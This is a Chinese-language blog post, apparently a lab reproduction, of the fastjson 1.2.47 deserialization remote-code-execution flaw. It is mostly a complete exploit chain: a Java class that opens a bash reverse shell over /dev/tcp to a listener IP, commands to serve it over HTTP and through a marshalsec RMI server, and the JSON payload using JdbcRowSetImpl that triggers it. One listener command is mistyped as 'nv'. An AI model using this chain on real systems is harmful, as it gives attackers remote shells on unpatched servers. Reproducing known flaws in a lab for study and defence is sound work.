---
title: Fastjson反序列化
date: 2021-01-11 21:45:35
categories: 漏洞复现
tags: Fastjson
---

#### 背景

​	fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。其目前已经被广泛应用在各种场景中，包括cache存储、RPC通讯、MQ通讯、网络协议通讯、Android客户端、Ajax服务器处理程序等等。

​	而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。

<!--more-->

**影响版本**

- fastjson <= 1.2.47

#### 复现过程

1.新建Exploit.java文件(名字随便起)，写入如下代码

```java
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class Exploit{
    public Exploit() throws Exception {
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/192.168.0.108/53;cat <&5 | while read line; do $line 2>&5 >&5; done"});
        InputStream is = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));

        String line;
        while((line = reader.readLine()) != null) {
            System.out.println(line);
        }

        p.waitFor();
        is.close();
        reader.close();
        p.destroy();
    }

    public static void main(String[] args) throws Exception {
    }
}
```

注意反弹shell的地址及端口

2.编译生成**Exploit.class**

`javac Exploit.java`

3.启动简单的http服务(和生成的Exploit.class在同一目录下)

`python3 -m http.server 80`

![](http://qn.laohuan.xin/Snipaste_2021-01-11_21-25-27.png)

4.借助[marshalsec](http://github.com/mbechler/marshalsec)项目，启动一个RMI服务

`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.0.108/#Exploit" 8080`

![](http://qn.laohuan.xin/Snipaste_2021-01-11_21-29-27.png)

5.nc 开启监听

`nv -lvp 53`

6.使用bp发送如下payload

```http
POST / HTTP/1.1
Host: 192.168.0.104:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 163

{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.0.108:8080/Exploit",
        "autoCommit":true
    }

}
```

注意rmi地址

![](http://qn.laohuan.xin/Snipaste_2021-01-11_21-31-17.png)



7.回弹shell

![](http://qn.laohuan.xin/Snipaste_2021-01-11_21-34-26.png)

##### fastjson检查脚本

[http://github.com/mrknow001/fastjson_rec_exploit](http://github.com/mrknow001/fastjson_rec_exploit)

##### 参考链接

[http://www.cnblogs.com/lyh1/p/nul1.html](http://www.cnblogs.com/lyh1/p/nul1.html)
[http://www.freesion.com/article/38861395538/](http://www.freesion.com/article/38861395538/)
[http://www.jianshu.com/p/e22c9dd4ed6d](http://www.jianshu.com/p/e22c9dd4ed6d)

[http://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce](http://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce)

